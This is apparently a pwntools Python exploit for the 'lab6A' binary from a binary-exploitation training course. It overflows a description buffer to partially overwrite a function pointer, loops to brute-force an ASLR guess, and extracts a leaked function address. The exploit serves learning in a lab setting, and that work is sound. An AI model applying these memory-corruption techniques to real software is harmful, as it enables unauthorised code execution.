# Based on https://github.com/ewilded/MBE-snippets/blob/master/lab6B/exploit_remote.py
from pwn import *

settings = {

    # Path to binary
    "binary"        : "./lab6A",

    # Path to custom libc
    "libc"          : None,
}

# Exploit here
def exploit():

    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary

    # Chose action 1 (setup account).
    p.sendlineafter("Enter Choice: ", "1")  
	
    # Send the name (31 characters + newline -> 32 chars)	
    p.recvuntil("Enter your name: ")		
    payload = "A" * 0x1f # 31 A's (just to fill the username)
    p.sendline(payload)
	
	# Send the description - 90 characters + EXACTLY TWO BYTES to partially overwrite the function pointer.
	# To avoid a newline creeping in and fucking up the second byte of the address (out of bound of our PARTIAL write)
	# we want to use send_raw() instead of sendline()/sendlineafter():
    p.recvuntil("Enter your description: ")
    payload = "B" * 0x5a # exactly ninety bytes to attai the saved print_listing() address
    payload = payload + p16(0xbbe2)
    p.send(payload)
    
    # OK, call this thing:
    p.sendlineafter("Enter Choice: ", "3")
	
    # Analyze the leak (we have to introduce a way to distinguish when the execution was successful as opposed to when we crashed the thing due to the lack of lack with ASLR and our fixed 0xb halfbyte).
    try:
        leak = p.recv()
	
    except EOFError:
	    print("No luck with ASLR this time.")
	    return 1	# let's return 1 to indicate that the program crashed, which means we failed with our guess of the ASLR-ed halfbyte and that the exploit() function must call this method again
    except:
       print("Another exception occured.")
       return 2

	# Some verbose output for debugging/troubleshooting purpose 
    # (this is redundant with context.log_level='debug' though).
    print("ASLR guess successful, below is the entire leak:") 
    print(leak)

    print_name_addr = u32(leak[0xaa:0xae]) # bytes 170:174 contain the address	
    print("print_name()'s current address: %x", hex(print_name_addr))
    return 0

# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])

    p = process(binary.path)
    while(exploit()!=0):
	    pass
